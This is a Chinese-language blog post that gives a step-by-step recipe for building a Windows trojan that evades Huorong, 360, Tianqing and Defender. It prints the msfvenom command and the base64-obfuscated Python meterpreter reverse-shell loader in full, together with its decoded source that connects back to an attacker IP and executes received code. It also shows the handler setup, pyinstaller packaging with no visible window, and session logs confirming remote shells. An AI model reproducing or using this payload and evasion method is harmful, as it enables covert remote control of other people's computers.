---
layout:     post            # 使用的布局（不需要改）
title:      MSF Windows免杀   # 标题
subtitle:   这里分享的是截止2021年9月7号测试仍免杀的Windows10木马，过火绒、360、天擎、Win10 defender。  # 副标题
date:       2021-09-07      # 时间
author:     K4ys0n           # 作者
header-img: img/post-bg-coffee.jpeg    # 这篇文章标题背景图片
catalog:    true            # 是否归档
tags:                       # 标签
    - 免杀
    - Windows
    - 网络安全
    - MSF
    - 木马
---

# 前言
本次目标是简单测试能过一般杀软的MSF木马，火绒、天擎、360、Win10 Defender等。

这里会用到MSF的一个payload：`python/meterpreter/reverse_tcp_ssl`。

PS：另外测了`python/meterpreter/reverse_https`也可以免杀，所以payload内容可能稍微没有太大的关系，主要还是pyinstaller打包。


# 步骤
## 1. msfvenom生成payload
kali中：
```shell
msfvenom -p python/meterpreter/reverse_tcp_ssl -a python --platform python LHOST=[你的的IP] LPORT=[你的端口] -f raw -o test.py
```
生成的test.py文件，打开如下：
```python
exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHpsaWIsYmFzZTY0LHNzbCxzb2NrZXQsc3RydWN0LHRpbWUKZm9yIHggaW4gcmFuZ2UoMTApOgoJdHJ5OgoJCXNvPXNvY2tldC5zb2NrZXQoMiwxKQoJCXNvLmNvbm5lY3QoKCcxOTIuMTY4LjEwMC4xMjknLDEwMTAxKSkKCQlzPXNzbC53cmFwX3NvY2tldChzbykKCQlicmVhawoJZXhjZXB0OgoJCXRpbWUuc2xlZXAoNSkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdihsKQp3aGlsZSBsZW4oZCk8bDoKCWQrPXMucmVjdihsLWxlbihkKSkKZXhlYyh6bGliLmRlY29tcHJlc3MoYmFzZTY0LmI2NGRlY29kZShkKSkseydzJzpzfSkK')[0]))
```
将代码中base64编码的内容进行解码，kali的终端中解码如下：
```shell
echo 'aW1wb3J0IHpsaWIsYmFzZTY0LHNzbCxzb2NrZXQsc3RydWN0LHRpbWUKZm9yIHggaW4gcmFuZ2UoMTApOgoJdHJ5OgoJCXNvPXNvY2tldC5zb2NrZXQoMiwxKQoJCXNvLmNvbm5lY3QoKCcxOTIuMTY4LjEwMC4xMjknLDEwMTAxKSkKCQlzPXNzbC53cmFwX3NvY2tldChzbykKCQlicmVhawoJZXhjZXB0OgoJCXRpbWUuc2xlZXAoNSkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdihsKQp3aGlsZSBsZW4oZCk8bDoKCWQrPXMucmVjdihsLWxlbihkKSkKZXhlYyh6bGliLmRlY29tcHJlc3MoYmFzZTY0LmI2NGRlY29kZShkKSkseydzJzpzfSkK' | base64 -d > payload.py
```
解码后的内容保存在payload.py文件中，内容如下：
```python
import zlib,base64,ssl,socket,struct,time
for x in range(10):
    try:
        so=socket.socket(2,1)
        so.connect(('192.168.0.1',10101))
        s=ssl.wrap_socket(so)
        break
    except:
        time.sleep(5)
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(l)
while len(d)<l:
    d+=s.recv(l-len(d))
exec(zlib.decompress(base64.b64decode(d)),{'s':s})
```

## 2. MSF监听器
在kali中MSF起一个监听器：
```shell
root@kali:~/test# msfconsole
...
...
msf6 > handler -H 0.0.0.0 -P 10101 -p python/meterpreter/reverse_tcp_ssl
[*] Payload handler running as background job 0.
```

## 3. 测试一下payload能否正常上线
在靶机（本地PC）中运行payload.py：
```cmd
python3 payload.py
```
可以看到msf中上线了：
```shell
msf6 > handler -H 0.0.0.0 -P 10101 -p python/meterpreter/reverse_tcp_ssl 
[*] Payload handler running as background job 0.
msf6 > 
[*] Started reverse SSL handler on 0.0.0.0:10101 
[*] Sending stage (39324 bytes) to 192.168.0.1
[*] Meterpreter session 1 opened (192.168.0.129:10101 -> 192.168.0.1:58972) at 2021-09-07 10:04:30 +0800

msf6 > 

```

## 4. 打包成exe过杀软
需要先在Windows环境中安装python3，并安装pyinstaller库。
```shell
pip install pyinstaller
```
然后在Windows环境中pyinstaller才会生成exe文件：
```shell
pyinstaller -Fw payload.py --hidden-import imp
```
PS：`hidden-import`参数使编译成exe时不导入imp库，否则会报错`No module named 'imp'`，原因是imp库在python3.4以后开始准备弃用，后续用importlib库代替，但payload中不需要用到这个库，所以直接屏蔽即可。
另外`w`参数可以使编译后的exe双击运行时无弹窗。

*PS2：打包成elf*
只需在linux环境下用pyinstaller打包即可生成elf，同4。

## 6. 上线测试
在靶机中运行exe文件，在kali的MSF监听中可以看到上线：
```shell
msf6 > [*] 192.168.0.1 - Meterpreter session 1 closed.  Reason: Died

[*] Sending stage (39328 bytes) to 192.168.0.1
[*] Meterpreter session 2 opened (192.168.0.129:10101 -> 192.168.0.1:62799) at 2021-09-07 10:15:06 +0800

msf6 > sessions

Active sessions
===============

  Id  Name  Type                        Information              Connection
  --  ----  ----                        -----------              ----------
  2         meterpreter python/windows  83400 @ DESKTOP-PENGDTG  192.168.0.129:10101 -> 192.168.0.1:62799 (192.168.100.1)

msf6 > 

```

# 总结
本次使用了MSF的`payload/python/meterpreter/reverse_tcp_ssl`模块，通信会进行ssl加密；其次，通过pyinstaller打包成exe之后文件会变成6、7MB，稍微有点大。